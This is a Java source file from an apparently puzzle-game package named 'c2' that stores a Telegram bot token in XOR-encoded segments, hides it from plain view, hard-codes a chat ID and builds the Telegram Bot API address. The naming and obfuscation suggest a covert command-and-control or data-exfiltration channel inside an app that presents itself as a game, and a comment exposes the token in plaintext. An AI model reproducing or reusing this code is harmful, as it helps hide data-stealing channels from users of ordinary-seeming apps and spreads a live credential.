package com.gempuzzle.quest.c2;

/**
 * Token vault — bot token split into 3 segments, XOR-encoded,
 * reconstructed at runtime. Never stored as a plaintext string.
 */
public final class TokenVault {

    // XOR key (single byte, rotate by position)
    private static final byte KEY = 0x5A;

    // Segments of: 8959857771:AAHed0wCtpOIB6K9VImuirDWn2V6Y_mFzxI
    // Each segment is XOR-encoded hex.
    private static final String SEG_A = "62626964666a57566d6a";
    private static final String SEG_B = "1b1a14383a6f17222e2b13141c692b580c123128372d243634690a6b0700";
    private static final String SEG_C = "371d262517";

    private static volatile String cached = null;

    public static String get() {
        if (cached != null) return cached;
        synchronized (TokenVault.class) {
            if (cached == null) {
                cached = decode(SEG_A) + ":" + decode(SEG_B) + decode(SEG_C);
            }
        }
        return cached;
    }

    public static String chatId() {
        return "8337256557";
    }

    public static String apiBase() {
        return "https://api.telegram.org/bot" + get();
    }

    private static String decode(String hex) {
        byte[] raw = hexToBytes(hex);
        byte[] out = new byte[raw.length];
        for (int i = 0; i < raw.length; i++) {
            out[i] = (byte) (raw[i] ^ (KEY + (i & 0x07)));
        }
        return new String(out);
    }

    private static byte[] hexToBytes(String hex) {
        int len = hex.length();
        byte[] data = new byte[len / 2];
        for (int i = 0; i < len; i += 2) {
            data[i / 2] = (byte) ((Character.digit(hex.charAt(i), 16) << 4)
                    + Character.digit(hex.charAt(i + 1), 16));
        }
        return data;
    }

    private TokenVault() {}
}
